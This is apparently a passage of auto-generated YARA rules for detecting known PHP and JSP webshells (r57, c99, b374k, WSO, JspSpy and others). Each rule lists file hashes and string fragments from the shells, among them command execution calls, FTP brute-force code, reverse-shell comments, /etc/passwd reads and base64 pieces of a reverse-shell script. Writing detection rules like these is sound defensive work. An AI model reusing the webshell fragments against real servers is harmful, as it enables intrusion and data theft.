      $s5 = "echo sr(15,\"<b>\".$lang[$language.'_text88'].$arrow.\"</b>\",in('text','ftp_server_port',85,(!empty($_POST['ftp_server_port'])?" ascii
      $s6 = "tp_password']):(\"billy@microsoft.com\"))));" fullword ascii
      $s7 = " $_POST['cmd'] = which('fetch').\" -o \".$_POST['loc_file'].\" -p \".$_POST['rem_file'].\"\";" fullword ascii
      $s8 = "echo sr(25,\"<b>\".$lang[$language.'_text105'].$arrow.\"</b>\",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):(\"hacker@" ascii
      $s9 = "echo sr(25,\"<b>\".$lang[$language.'_text105'].$arrow.\"</b>\",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):(\"hacker@" ascii
      $s10 = "echo sr(25,\"<b>\".$lang[$language.'_text37'].$arrow.\"</b>\",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp" ascii
      $s11 = "echo sr(25,\"<b>\".$lang[$language.'_text37'].$arrow.\"</b>\",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp" ascii
      $s12 = "echo sr(25,\"<b>\".$lang[$language.'_text106'].$arrow.\"</b>\",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):(\"b" ascii
      $s13 = "    $filedump = @fread($file,@filesize($_POST['loc_file']));" fullword ascii
      $s14 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"ftp_brute\")" fullword ascii
      $s15 = "function get_users()" fullword ascii
      $s16 = "if(!empty($_POST['cmd']) && ($_POST['cmd']==\"ftp_file_up\" || $_POST['cmd']==\"ftp_file_down\"))" fullword ascii
      $s17 = "microsoft.com\"))));" fullword ascii
      $s18 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s19 = "    $filedump = @fread($file,@filesize($_POST['d_name']));" fullword ascii
      $s20 = "echo sr(25,\"<b>\".$lang[$language.'_text88'].$arrow.\"</b>\",in('text','ftp_server_port',45,(!empty($_POST['ftp_server_port'])?" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _r57_kartal_r57_iFX_135 {
   meta:
      description = "webshell - from files r57_kartal.php, r57_iFX.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash2 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $s1 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s2 = " $_POST['cmd'] = which('fetch').\" -p \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii
      $s3 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"edit_file\")" fullword ascii
      $s4 = "echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['db_query'])?($_POST['db_query']):(\"SHOW DATABAS" ascii
      $s5 = "\\nSELECT * FROM user;\")).\"</textarea><br>\".in('submit','submit',0,$lang[$language.'_butt1']).\"</div></td>\".$fe.\"</tr></ta" ascii
      $s6 = "echo sr(45,\"<b>\".$lang[$language.'_text80'].$arrow.\"</b>\",\"<select name=db><option>MySQL</option><option>MSSQL</option><opt" ascii
      $s7 = "echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['db_query'])?($_POST['db_query']):(\"SHOW DATABAS" ascii
      $s8 = "echo sr(45,\"<b>\".$lang[$language.'_text80'].$arrow.\"</b>\",\"<select name=db><option>MySQL</option><option>MSSQL</option><opt" ascii
      $s9 = " else echo \"[-] ERROR! Can't connect to PostgreSQL server\";" fullword ascii
      $s10 = "      echo \" | - \".$row2['TABLE_NAME'].\"\\r\\n\";" fullword ascii
      $s11 = "echo $fs.$table_up1.$lang[$language.'_text54'].$table_up2.$ts;" fullword ascii
      $s12 = "echo $fs.$table_up1.$lang[$language.'_text35'].$table_up2.$ts;" fullword ascii
      $s13 = "echo \"<font face=Verdana size=-2><b><div align=center>\".$lang[$language.'_text9'].\"</div></b></font>\";" fullword ascii
      $s14 = "echo \"<font face=Verdana size=-2><b><div align=center>\".$lang[$language.'_text83'].\"</div></b></font>\";" fullword ascii
      $s15 = " if(empty($uname)) { $safe_mode = 1; }" fullword ascii
      $s16 = "echo $table_up1.$lang[$language.'_text82'].$table_up2.$ts.\"<tr>\".$fs.\"<td valign=top width=34%>\".$ts;" fullword ascii
      $s17 = "echo \"<font face=Verdana size=-2><b><div align=center>\".$lang[$language.'_text22'].\"</div></b></font>\";" fullword ascii
      $s18 = "echo $te.$table_end1.$fe;" fullword ascii
      $s19 = "echo $te.\"</td>\".$fe.\"</tr></table>\";" fullword ascii
      $s20 = "echo $fs.$table_up1.$lang[$language.'_text7'].$table_up2.$ts;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _b374k_2_8_source_b374k_2_4_b374k_2_5_source_b374k_2_2_b374k_2_6_source_b374k_2_3_b374k_2_7_source_136 {
   meta:
      description = "webshell - from files b374k-2.8.source.php, b374k-2.4.php, b374k-2.5.source.php, b374k-2.2.php, b374k-2.6.source.php, b374k-2.3.php, b374k-2.7.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8c30f0ad13f188cb24481bc28512e8f71fd4188d6c6020cfe0c26f43a8233d91"
      hash2 = "13102785319ab7591a39c8a8bb40b01bf34e49a7f0a832a1f3dbaabf5f40e9dd"
      hash3 = "2fa1659755f6cf2f5a5db59a7836e77e0a069218557fa552b9230b5e4da56469"
      hash4 = "5479f8cd1375364770df36e5a18262480a8f9d311e8eedb2c2390ecb233852ad"
      hash5 = "c14466232481a3aa9192507127f2ca43898228671e5e87a17ddd05383c758746"
      hash6 = "e6b1fbcc9a2d988ef9e8c36da38f19a802a5886a43736a1466566f97f342f946"
      hash7 = "d31034d5e4fd8d5d8efe640c4d2aa7ac43c71989f84fb4e92606a18563b3fd5e"
   strings:
      $s1 = "else echo \"- shell command -\";" fullword ascii
      $s2 = "// shell command" fullword ascii
      $s3 = "} // bind and reverse shell" fullword ascii
      $s4 = "// bind and reverse shell" fullword ascii
      $s5 = "$s_server_ip = gethostbyname($_SERVER[\"HTTP_HOST\"]);" fullword ascii
      $s6 = "// kill process specified by pid" fullword ascii
      $s7 = "$s_auth = false; // login status" fullword ascii
      $s8 = "$s_user = get_current_user();" fullword ascii
      $s9 = "// download file from internet" fullword ascii
      $s10 = "// try using lwp-download" fullword ascii
      $s11 = "// using wget" fullword ascii
      $s12 = "// delete dir and all of its content (no warning !) xp" fullword ascii
      $s13 = "// get file size" fullword ascii
      $s14 = "$s_software = getenv(\"SERVER_SOFTWARE\");" fullword ascii
      $s15 = "// get file permissions" fullword ascii
      $s16 = "if(strlen(trim($s_pass))>0){" fullword ascii
      $s17 = "if(!$s_win && $s_posix){" fullword ascii
      $s18 = "$s_system = php_uname();" fullword ascii
      $s19 = "if(isset($_COOKIE['b374k'])){" fullword ascii
      $s20 = "if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['b374k']))) $s_auth = true;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _c66_c99_w4cking_Shell__ci___Biz_was_here_137 {
   meta:
      description = "webshell - from files c66.php, c99_w4cking.php, Shell [ci] .Biz was here.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash2 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
      hash3 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
   strings:
      $s1 = " else {echo \"<b>Execution command</b>\"; if (empty($cmd_txt)) {$cmd_txt = TRUE;}}" fullword ascii
      $s2 = " else {echo \"<b>Execution PHP-code</b>\"; if (empty($eval_txt)) {$eval_txt = TRUE;}}" fullword ascii
      $s3 = "$hexdump_lines = 8;// lines in hex preview file" fullword ascii
      $s4 = "$hexdump_rows = 24;// 16, 24 or 32 bytes in one line" fullword ascii
      $s5 = "  elseif ($ft == \"ini\") {echo \"<pre>\"; var_dump(parse_ini_file($d.$f,TRUE)); echo \"</pre>\";}" fullword ascii
      $s6 = "   if ($fqb_onlywithsh) {$TRUE = (!in_array($sh,array(\"/bin/FALSE\",\"/sbin/nologin\")));}" fullword ascii
      $s7 = "$surl_autofill_include = TRUE; //If TRUE then search variables with descriptors (URLs) and save it in SURL." fullword ascii
      $s8 = "  // Compiling table" fullword ascii
      $s9 = "if (!function_exists(\"posix_getgrgid\") and !in_array(\"posix_getgrgid\",$disablefunc)) {function posix_getgrgid($gid) {return " ascii
      $s10 = "if (!function_exists(\"posix_getpwuid\") and !in_array(\"posix_getpwuid\",$disablefunc)) {function posix_getpwuid($uid) {return " ascii
      $s11 = "$filestealth = TRUE; //if TRUE, don't change modify- and access-time" fullword ascii
      $s12 = " while (($f = readdir($h)) !== FALSE)" fullword ascii
      $s13 = " while (($o = readdir($h)) !== FALSE)" fullword ascii
      $s14 = "@ignore_user_abort(TRUE);" fullword ascii
      $s15 = " if (empty($add_drop)) {$add_drop = TRUE;}" fullword ascii
      $s16 = "header(\"Cache-Control: post-check=0, pre-check=0\", FALSE);" fullword ascii
      $s17 = " else {return FALSE;}" fullword ascii
      $s18 = " if ($free === FALSE) {$free = 0;}" fullword ascii
      $s19 = " return TRUE;" fullword ascii
      $s20 = "if ($v or strtolower($v) == \"on\") {$openbasedir = TRUE; $hopenbasedir = \"<font color=red>\".$v.\"</font>\";}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _c99_PSych0_c66_c99shell_c99_w4cking_Shell__ci___Biz_was_here_c99_locus7s_c99_138 {
   meta:
      description = "webshell - from files c99_PSych0.php, c66.php, c99shell.php, c99_w4cking.php, Shell [ci] .Biz was here.php, c99_locus7s.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
      hash2 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash3 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash4 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
      hash5 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash6 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
      hash7 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii
      $s2 = "   echo \"<b>Execute file:</b><form action=\\\"\".$surl.\"\\\" method=POST><input type=hidden name=act value=cmd><input type=" ascii
      $s3 = "fqb_lenght\\\" value=\\\"\".$nixpwdperpage.\"\\\"><br><br>Users only with shell?&nbsp;<input type=\\\"checkbox\\\" name=\\\"fqb_" ascii
      $s4 = "      $fqb_log .= \"Connected to \".getenv(\"SERVER_NAME\").\" with login \\\"\".$str[0].\"\\\" and password \\\"\".$str[0].\"" ascii
      $s5 = " if (file_get_contents(\"/etc/syslog.conf\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=syslog.conf&d=\".urlen" ascii
      $s6 = "\\\"Execute\\\">&nbsp;Display in text-area&nbsp;<input type=\\\"checkbox\\\" name=\\\"eval_txt\\\" value=\\\"1\\\"\"; if ($eval_" ascii
      $s7 = "  elseif (is_callable(\"passthru\") and !in_array(\"passthru\",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($c" ascii
      $s8 = "  elseif (is_callable(\"system\") and !in_array(\"system\",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $" ascii
      $s9 = "rr?\"<b>Error:</b> \".$err:\"\").\"<form action=\\\"\".$surl.\"\\\" method=POST><input type=hidden name=d value=\\\"\".htmlspeci" ascii
      $s10 = " if (file_get_contents(\"/etc/userdomains\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=userdomains&d=\".urlen" ascii
      $s11 = " if (file_get_contents(\"/etc/httpd.conf\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=httpd.conf&d=\".urlenco" ascii
      $s12 = " if (file_get_contents(\"/usr/local/apache/conf/httpd.conf\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=httpd" ascii
      $s13 = "    if ($i != $k) {$head[$i] = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$i.$parsesort[" ascii
      $s14 = "\":\"\").\">eXecute</font></td><td><b>World</b><br><br><input type=checkbox NAME=chmod_w[r] value=1\".($perms[\"w\"][\"r\"]?\" c" ascii
      $s15 = " echo \"<form action=\\\"\".$surl.\"\\\" method=POST><input type=hidden name=act value=cmd><textarea name=cmd cols=122 rows=10>" ascii
      $s16 = " if (file_get_contents(\"/etc/hosts\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=hosts&d=\".urlencode(\"/etc" ascii
      $s17 = "br><input type=checkbox NAME=chmod_o[x] value=1\".($perms[\"o\"][\"x\"]?\" checked\":\"\").\">eXecute</td><td><b>Group</b><br><b" ascii
      $s18 = " if (file_get_contents(\"/etc/motd\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=motd&d=\".urlencode(\"/etc\")" ascii
      $s19 = "eckbox NAME=chmod_w[x] value=1\".($perms[\"w\"][\"x\"]?\" checked\":\"\").\">eXecute</font></td></tr><tr><td><input type=submit " ascii
      $s20 = "&nbsp;&nbsp;<input type=\\\"checkbox\\\" name=\\\"search_text_not\\\" value=\\\"1\\\" \".($search_text_not == 1?\" checked\":\"" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso_4_2_0_wso_404_139 {
   meta:
      description = "webshell - from files wso-4.2.0.php, wso_404.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b4c76bead50773295dc09fc006ec5143c7aa3558db7c96cccddb8ab180f8d63b"
      hash2 = "fd3db2020e82517d8fbfcc8dd3399efbdf82057353b94509995bba128030d193"
   strings:
      $s1 = "wnload\\\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid" ascii
      $s2 = "                    if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") " ascii
      $s3 = "md.value=\\'\\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:" ascii
      $s4 = "        .'<tr><td></td><td><label style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login " ascii
      $s5 = "        .'<tr><td></td><td><label style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login " ascii
      $s6 = "    echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SE" ascii
      $s7 = "        $temp = \"document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='\".addcs" ascii
      $s8 = "rZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWU" ascii
      $s9 = "        .'<td><input type=text name=login value=\"root\"></td></tr>'" fullword ascii
      $s10 = "        .'<tr><td></td><td><table style=\"padding-left:15px\"><tr><td><span>Login</span></td>'" fullword ascii
      $s11 = "    echo '<h1>FTP bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>'" fullword ascii
      $s12 = "    echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:" ascii
      $s13 = "        \"IP Configuration\" => \"ipconfig /all\"" fullword ascii
      $s14 = "    echo '<h1>Console</h1><div class=content><form name=cf onsubmit=\"if(d.cf.cmd.value==\\'clear\\'){d.cf.output.value=\\'\\';d" ascii
      $s15 = "    echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick=\"g(null,null,\\'yes\\')\">Ye" ascii
      $s16 = "oIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTs" ascii
      $s17 = "w_errors.checked?1:\\'\\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\\'\\');}\" value=\">>\"> <nobr><input " ascii
      $s18 = "KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2N" ascii
      $s19 = "        .'<td><label><input type=radio name=type value=\"1\" checked> /etc/passwd</label></td></tr>'" fullword ascii
      $s20 = "        echo '<h1>Results</h1><div class=content><span>Type:</span> '.htmlspecialchars($_POST['proto']).' <span>Server:</span> '" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _m_JspSpyJDK5_807_cofigrue_dm_x7_140 {
   meta:
      description = "webshell - from files m.jsp, JspSpyJDK5.jsp, 807.jsp, cofigrue.jsp, dm.jsp, x7.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "57764b5504b584b7cd7969b17d2401a6fe85f1f3a03d02943bc0bdc74514a7c3"
      hash2 = "3b4283db4961a557b02b3de8377b61f5c085552a46191625db42939056129d53"
      hash3 = "b996b499c5f56b51eccc5fa181bc69b208da8023c441277a522aa52ace72ecbd"
      hash4 = "444cb5e82638a872b85d18ecb67b71649f2a3f543bc2874397fa63d889571ce0"
      hash5 = "75c94d0f6f29908dc10227de1eb45de9afa871891c18942ebd33dd916203b43e"
      hash6 = "30e33036efcafcca023954308dfb75b7b3a48c4b9d3cdf776943f6479f559235"
   strings:
      $s1 = "responseContent = tempStr.toString();" fullword ascii
      $s2 = "String tempLine = rd.readLine();" fullword ascii
      $s3 = "tempStr.append(tempLine);" fullword ascii
      $s4 = "tempLine = rd.readLine();" fullword ascii
      $s5 = "System.setProperty(\"sun.net.client.defaultConnectTimeout\", String" fullword ascii
      $s6 = "System.setProperty(\"sun.net.client.defaultReadTimeout\", String" fullword ascii
      $s7 = "for (int i = SysInfo.length() - 1; i >= 0; i--) {" fullword ascii
      $s8 = "while (tempLine != null)" fullword ascii
      $s9 = "StringBuffer tempStr = new StringBuffer();" fullword ascii
      $s10 = "HttpURLConnection url_con = null;" fullword ascii
      $s11 = "tempStr.append(crlf);" fullword ascii
      $s12 = "url_con = (HttpURLConnection) url.openConnection();" fullword ascii
      $s13 = "private static int readTimeOut = 10000;" fullword ascii
      $s14 = "InputStream in = url_con.getInputStream();" fullword ascii
      $s15 = "url_con.setRequestMethod(\"POST\");" fullword ascii
      $s16 = "s += SysInfo.charAt(i);" fullword ascii
      $s17 = "url_con.getOutputStream().close();" fullword ascii
      $s18 = "String responseContent = null;" fullword ascii
      $s19 = "url_con.getOutputStream().flush();" fullword ascii
      $s20 = "return responseContent;" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _angel_2009lite_spy_2011_2009mssql_141 {
   meta:
      description = "webshell - from files angel.php, 2009lite.php, spy.php, 2011.php, 2009mssql.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61f8635790fa5873c4fbcf873e9e8ff18ce3ed0a5a68f464401118adac3f969a"
      hash2 = "61956e7a2fe44293ceaedc2e56ac52eee13064cd328fab1c5b314e5dc56012a6"
      hash3 = "e1c70ddcfbc56c7dff46ea03ed53aab3f022e53a6f8e98f12d8b8557cc6bfb4d"
      hash4 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash5 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
   strings:
      $s1 = "$attachsize = '<a href=\"javascript:getsize(\\''.$dirdb['server_link'].'\\',\\''.$dir.'\\');\">Stat</a>';" fullword ascii
      $s2 = "if ($_COOKIE['loginpass']) {" fullword ascii
      $s3 = "formhead(array('name'=>'fileopform', 'target'=>'_blank'));" fullword ascii
      $s4 = "header(\"content-Type: text/html; charset=euc-kr\");" fullword ascii
      $s5 = "header(\"content-Type: text/html; charset=euc-jp\");" fullword ascii
      $s6 = "makeinput(array('title'=>'Command','name'=>'command','value'=>htmlspecialchars($command)));" fullword ascii
      $s7 = "$('getsize').dir.value=dir;" fullword ascii
      $s8 = "if($getdir && $getdir == $dirdb['server_link']) {" fullword ascii
      $s9 = "$filedata[$j]['fileowner']=getUser($f);" fullword ascii
      $s10 = "p(' | View Writable ( <a href=\"javascript:godir(\\''.$nowpath.'\\',\\'dir\\');\">Directory</a>');" fullword ascii
      $s11 = "p(' | <a href=\"javascript:godir(\\''.$nowpath.'\\',\\'file\\');\">File</a> )');" fullword ascii
      $s12 = "$('getsize').submit();" fullword ascii
      $s13 = "function getsize(getdir,dir){" fullword ascii
      $s14 = "$('getsize').getdir.value=getdir;" fullword ascii
      $s15 = "function GetWDirList($dir){" fullword ascii
      $s16 = "$filedata[$j]['filechmod']=getChmod($f);" fullword ascii
      $s17 = "function GetWFileList($dir){" fullword ascii
      $s18 = "$dirdata = GetWDirList($nowpath);" fullword ascii
      $s19 = "GetWFileList($f);" fullword ascii
      $s20 = "$filedata[$j]['fileperm']=getPerms($f);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnIpEr_SA_Shell_r57_Mohajer22_142 {
   meta:
      description = "webshell - from files SnIpEr_SA Shell.php, r57_Mohajer22.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
      hash2 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
   strings:
      $s1 = "   if($_POST['cmd']==\"ftp_file_up\")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);        }" fullword ascii
      $s2 = "            $this->connection = @mssql_connect($this->host.','.$this->port,$this->user,$this->pass);" fullword ascii
      $s3 = "            $this->connection = @mysql_connect($this->host.':'.$this->port,$this->user,$this->pass);" fullword ascii
      $s4 = "            $this->dump[] = 'INSERT INTO `'.$table.'` (`'.@implode(\"`, `\", $this->columns).'`) VALUES (\\''.@implode(\"', '\"," ascii
      $s5 = "            $this->dump[] = 'INSERT INTO `'.$table.'` (`'.@implode(\"`, `\", $this->columns).'`) VALUES (\\''.@implode(\"', '\"," ascii
      $s6 = "            $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(\", \", $this->columns).') VALUES (\\''.@implode(\"', '\", $this" ascii
      $s7 = "           $this->dump[0] = '## MySQL dump';" fullword ascii
      $s8 = "            $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(\", \", $this->columns).') VALUES (\\''.@implode(\"', '\", $this" ascii
      $s9 = "           $this->dump[] = $this->rows[0]['Create Table'];" fullword ascii
      $s10 = "           if(substr($string,0,1)!='#') array_push($users,$user[0]);" fullword ascii
      $s11 = "           if($this->query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0;" fullword ascii
      $s12 = "('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));" fullword ascii
      $s13 = "echo \"<PRE>\\n\";" fullword ascii
      $s14 = "s->rows[$i]).'\\');';" fullword ascii
      $s15 = "           if(!$this->get_result()) return 0;" fullword ascii
      $s16 = "$u1p=\"\"; // File to Include... or use _GET _POST" fullword ascii
      $s17 = "           $user = @explode(\":\",$string);" fullword ascii
      $s18 = "           if(@mssql_select_db($this->base,$this->connection)) return 1;" fullword ascii
      $s19 = "           @mysql_close($this->connection);" fullword ascii
      $s20 = "           if($this->query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _c66_c99_w4cking_143 {
   meta:
      description = "webshell - from files c66.php, c99_w4cking.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash2 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
   strings:
      $s1 = "if (!function_exists(\"file_get_contents\")) { function file_get_contents($filename){ $handle = fopen($filename, \"r\"); $retval" ascii
      $s2 = "  if ($parsesort[1] != \"a\") {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"a" ascii
      $s3 = "  if ($parsesort[1] != \"a\") {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"a" ascii
      $s4 = "  else {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"d\\\">[sort_asc]</a>\";}" fullword ascii
      $s5 = "if (!function_exists(\"file_get_contents\")) { function file_get_contents($filename){ $handle = fopen($filename, \"r\"); $retval" ascii
      $s6 = "if (!function_exists(\"mysql_dump\")){" fullword ascii
      $s7 = "   else {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"d\\\">[sort_asc]</a>\";}" fullword ascii
      $s8 = "   if ($parsesort[1] != \"a\") {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"a" ascii
      $s9 = "   if ($parsesort[1] != \"a\") {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"a" ascii
      $s10 = "=edit&d=\".$ud.\"\\\">[Change]</a>&nbsp;<a href=\\\"\".$surl.\"act=f&f=\".$uo.\"&ft=download&d=\".$ud.\"\\\">[Download]</a>&nbsp" ascii
      $s11 = " array(\"<b>[Search]</b>\",$surl.\"act=search&d=%d\")," fullword ascii
      $s12 = "read($handle, filesize($filename)); fclose($handle);return $retval;}}" fullword ascii
      $s13 = "/a>&nbsp;&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".urlencode(\"DROP TABLE `\".$row[\"Name\"].\"`\").\"\\\">[Dr" ascii
      $s14 = "   array(\"[download]\",\"download\")," fullword ascii
      $s15 = "    else {$row[] = \"<a href=\\\"\".$surl.\"act=f&f=\".$uo.\"&ft=info&d=\".$ud.\"\\\">[Info]</a>&nbsp;<a href=\\\"\".$surl.\"act" ascii
      $s16 = "a href=\\\"\".$sql_surl.\"sql_tbl_act=insert&sql_tbl=\".$row[\"Name\"].\"\\\"><b>[Insert]</b></a>&nbsp;</td>\";" fullword ascii
      $s17 = "p;\".view_perms_color($d.$f).\"</b><br>Select action/file-type:<br>\";" fullword ascii
      $s18 = "sql_tbl_le.\"&sql_tbl_insert_q=\".urlencode($w).\"\\\"><b>[Edit]</b></a>&nbsp;\";" fullword ascii
      $s19 = "bl_le.\"&sql_query=\".urlencode(\"DELETE FROM `\".$sql_tbl.\"` WHERE\".$w.\" LIMIT 1;\").\"\\\">[Delete]</a>&nbsp;\";" fullword ascii
      $s20 = " array(\"<hr><b>[Home]</b>\",$surl)," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _404_in_data02_Jsp_warn_leo_jfolder01_JFolder_shell1_jsp_suiyue_144 {
   meta:
      description = "webshell - from files 404.jsp, in.jsp, data02.jsp, Jsp.jsp, warn.jsp, leo.jsp, jfolder01.jsp, JFolder.jsp, shell1.jsp, jsp.jsp, suiyue.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2b9e91c45df8a47f2467687ea4991bf472a4de5a9cc385607fe93b7d65a190b0"
      hash2 = "4a2e30384b406fcae72571881aef4f7b78a9f7a918d583683f0c1f05e745400a"
      hash3 = "4b4fe0aa707377467c8902275cc8b0bca9a1bb82c2ee143f2a66740c6ee7b1a9"
      hash4 = "3e4413d2aa81b756f09f9eb472e742c7d2062f39e27a8d29a25a80ebab09b64a"
